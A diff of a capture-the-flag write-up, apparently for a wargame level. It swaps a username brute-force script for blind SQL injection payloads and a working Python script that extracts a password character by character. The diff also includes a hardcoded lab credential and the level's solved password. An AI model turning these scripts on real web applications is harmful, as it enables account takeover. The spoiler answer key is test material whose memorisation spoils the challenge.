@@ -122,91 +122,7 @@ _____
 
 SELECT * from users where username="" OR 1=1-- "
 ```
-
-Bruteforcing the webapp using the following script* we found out the **alice** is a valid username.
-
-```python
-import requests
-import sys
-import urllib3
-import concurrent.futures
-from concurrent.futures import ThreadPoolExecutor
-
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-# PROXY ALL REQUESTS THROUGH BURP
-proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}
-
-
-def postRequest(s, target_url, username):
-    # DEFINE ARGUMENTS TO SEND ALONG THE POST REQUEST
-    params = {
-        'username' : username
-    }
-
-    headers = {
-        'Authorization': 'Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg=='
-    }
-
-    # SEND REQUEST
-    r = s.post(target_url, headers=headers, data=params, verify=False, proxies=proxies)
-
-    # CHECK IF USERNAME IS VALID
-    if "This user exists." in r.text:
-        return username, r.status_code
-
-
-
-def main():
-    if len(sys.argv) != 2:
-        print("[-] Wrong number of arguments!")
-        print("[-] Usage: %s <url>" % sys.argv[0])
-        sys.exit(-1)
-
-    url = sys.argv[1].strip()
-    s = requests.Session()
-
-    target_url = url + '/index.php'
-    usernames = []
-    
-    # LOAD USERNAMES IN A LIST
-    with open(r'.\usernames.txt', 'r') as file:
-        print("[+] Loading all usernames in a list...")
-        for line in file.readlines():
-            username = line.strip()
-            sys.stdout.write("[+] Added username %s\r" % username)
-            sys.stdout.flush()
-            sys.stdout.write("\033[K")
-            usernames.append(username)
-        
-    how_many_usernames = len(usernames)
-    print("[+] All set! %i usernames loaded" % how_many_usernames)
-
-    # START THREADED EXECUTION
-    with ThreadPoolExecutor (max_workers=5) as executor:
-        future_to_url = {executor.submit(postRequest, s, target_url, username) for username in usernames}
-        for future in concurrent.futures.as_completed(future_to_url):
-            try:
-                
-                    data = future.result()
-                    if data:
-                        print(data[0], data[1])
-                
-
-            except Exception as exc:
-                print("[-] Error: %s" % exc)
-
-if __name__ == "__main__":
-    main()
-```
-
-\*This script is _raw_: it is fast but you need to kill the process to stop it.  
-
-<img src="https://github.com/jupitersinsight/writeups/assets/110602224/0d4d4bb1-f534-4ffe-b221-1dff673f4557" width=600 height=auto>  
-
-Double-check the script result.  
-
-<img src="https://github.com/jupitersinsight/writeups/assets/110602224/c20e0ef8-326e-4bd7-b941-31d62b8f9542" width=900 height=auto>
+Testing for the username _natas16_ we find it to exist in the database.  
 
 Now that we have found a valid username, we need to extract its password. Once again we can infer from the error messages when our query is TRUE, when is FALSE, and even when it contains syntax errors.  
 
@@ -229,20 +145,99 @@ if(array_key_exists("username", $_REQUEST))
     	}
 ```  
 
-<img src="https://github.com/jupitersinsight/writeups/assets/110602224/cd5323a7-f20d-4e78-9428-62eda2b82b16" width=900 height=auto>
+<img src="https://github.com/jupitersinsight/writeups/assets/110602224/b81614ba-5118-495d-9498-ecb76810ca93" width=900 height=auto>
 
 Putting all pieces together we can enumerate the password of known users one character at a time, starting from determining the actual password length.  
 
-Payload:` ' AND (SELECT username FROM users WHERE username='alice' and LENGTH(password)>1)='alice'-- `  
+Payload:` ' AND (SELECT username FROM users WHERE username='natas16' and LENGTH(password)=1)='natas16'-- `  
 
-<img src="https://github.com/jupitersinsight/writeups/assets/110602224/fdff36e5-cd4c-4779-bc22-276328df7928" width=900 height=auto>  
-
-<img src="https://github.com/jupitersinsight/writeups/assets/110602224/e64a5263-a1c7-4f63-83aa-bfac8e075833" widht=900 height=auto>  
+<img src="https://github.com/jupitersinsight/writeups/assets/110602224/d7a3845d-b0f3-4249-ac3a-8bf795c827cd" width=900 height=auto>  
 
 Once we know the length of the password, we can start enumerating on character at a time.  
 
-Payload: `' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='alice')='a'-- `  
+Payload: `' AND (SELECT SUBSTRING(BINARY+password, 1, 1) FROM users WHERE username='natas16')='a'-- `  
+_BINARY is necessary to obtain a case sensitive response from the database_
 
 Using BurpIntruder (instructed to grep match on expression "This user exists.") we can see that the first character of the password is **h**.  
 
-<img src="https://github.com/jupitersinsight/writeups/assets/110602224/d679ab87-9c3c-4502-beaf-da5f74896527" width=450 height=auto>  
+Here a python script which takes the url of the lab as argument, checks password length for the hardcoded user and enumerate its password.  
+```python
+import requests
+import urllib3
+import sys
+from string import ascii_lowercase, ascii_uppercase
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# SEND ALL TRAFFIC THROUGH THE PROXY, BURP PROXY IN THIS CASE
+proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}
+
+# FUNCTION TO DETERMINE THE LENGTH OF THE PASSWORD
+def find_psw_length(username, index_url, auth):
+    for i in range(0, 100):
+        payload = index_url+'?username={0}"+AND+(SELECT+username+FROM+users+WHERE+username="{0}"+and+LENGTH(password)={1})="{0}"--+&debug=true'.format(username, i)
+        sys.stdout.write("[+] Testing length... {0}\r".format(i))
+        sys.stdout.flush()
+        sys.stdout.write("\033[k")
+        r = requests.get(payload, headers=auth, proxies=proxies, verify=False)
+        if "This user exists." in r.text:
+            print("\n[+] Password length is %i" % i)
+            return i
+    # If max value is out of range    
+    print("\n[-] Could not determine the password length")
+    sys.exit(-1)
+
+# FUNCTION TO DETERMINE THE ACTUAL PASSWORD
+def enumerate_psw(index_url, username, auth, password_length):
+    # Create a string with all possible characters the password may include
+    chars = ascii_lowercase+ascii_uppercase+"0123456789"
+    # Initialize the password variable to be empty
+    password = ""
+    # For every index (position) test if the characters is correct
+    for i in range(1, password_length+1):
+        for j in chars:
+            payload = index_url+'?username={0}"+AND+(SELECT+SUBSTRING(BINARY+password,{1},1)+FROM+users+WHERE+username="{0}")="{2}"--+&debug=true'.format(username, i, j)
+            r = requests.get(payload, headers=auth, proxies=proxies, verify=False)
+            # If it is correct, update the variable password and break the execution to skip over to the next index
+            if "This user exists." in r.text:
+                password = password + j
+                break
+            sys.stdout.write("[+] Password: {0}{1}\r".format(password, j))
+            sys.stdout.flush()
+            sys.stdout.write("\033[k")
+    if password:
+        return password
+    else:
+        print("\n[-] Something went wrong!")
+
+
+def main():
+    # If the wrong number of argument is supplied, print error message
+    if len(sys.argv) != 2:
+        print("[-] Usage: %s url" % sys.argv[0])
+        sys.exit(-1)
+
+    url = sys.argv[1].strip()
+    index_url = url + '/index.php'
+    
+    # Authorization header
+    auth = {
+        'Authorization' : 'Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg=='
+    }
+
+    username = 'natas16'
+    print("[+] Let's find out the password length")
+    password_length = find_psw_length(username, index_url, auth)
+    
+    if password_length:
+        print("[+] Let's proceed and identify the password's characters")
+    
+    password = enumerate_psw(index_url, username, auth, password_length)
+    print("[+] The password is %s" % password)
+
+if __name__ == "__main__":
+    main()
+```
+<img src="https://github.com/jupitersinsight/writeups/assets/110602224/7e46dcfc-6382-4d51-9ac6-241d1ef55200" width=450 height=auto>
+
+The password is: **TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V**
